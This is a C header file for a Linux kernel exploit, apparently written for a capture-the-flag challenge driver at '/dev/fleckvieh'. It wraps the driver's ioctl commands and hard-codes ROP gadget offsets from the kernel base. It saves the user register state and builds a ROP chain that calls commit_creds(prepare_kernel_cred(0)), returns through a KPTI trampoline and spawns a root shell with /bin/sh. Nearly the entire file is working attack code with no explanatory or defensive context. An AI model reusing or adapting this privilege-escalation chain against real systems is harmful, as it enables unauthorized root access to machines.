#pragma once
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>

#define DEVICE_PATH "/dev/fleckvieh"
#define CMD_ADD     0xf1ec0001
#define CMD_DEL     0xf1ec0002
#define CMD_GET     0xf1ec0003
#define CMD_SET     0xf1ec0004
#define ERROR(x)    printf("Error: %s\n", x); return -1;


#define pop_rdi_ret                       0x09b0ed + kbase
#define pop_rcx_ret                       0x022fe3 + kbase
#define mov_rdi_rax_rep_movsq_ret         0x654bdb + kbase
#define push_rdx_cmp_eax_pop_rsp_rbp_ret  0x09b13a + kbase
#define commit_creds                      0x072830 + kbase
#define prepare_kernel_creds              0x0729d0 + kbase
#define kpti_trampoline                   0x800e26 + kbase


typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

int fd, id;
cpu_set_t main_cpu;
int ioctl_add(char *data, size_t size){
    request_t req = {.data = data, .size = size};
    int ret;
    if((ret = ioctl(fd, CMD_ADD, &req)) == -EINVAL){return -1;}
    return ret; // id
}
int ioctl_del(int id){
    request_t req = {.id = id};
    int ret;
    if((ret = ioctl(fd, CMD_DEL, &req)) == -EINVAL){return -1;}
    return ret; // id
}
int ioctl_get(int id, char *data, size_t size){
    request_t req = {.id = id, .data = data, .size = size};
    int ret;
    if((ret = ioctl(fd, CMD_GET, &req)) == -EINVAL){return -1;}
    return ret; // id
}
int ioctl_set(int id, char *data, size_t size){
    request_t req = {.id = id, .data = data, .size = size};
    int ret;
    if((ret = ioctl(fd, CMD_SET, &req)) == -EINVAL){return -1;}
    return ret; // id
}


uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
   // ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    //".att_syntax;"
    );
}


uint64_t *create_rop_chain(uint64_t kbase){
    uint64_t *payload = (uint64_t *)malloc(0x100);
    int i = 0;
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rcx_ret;
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;
    return payload;


}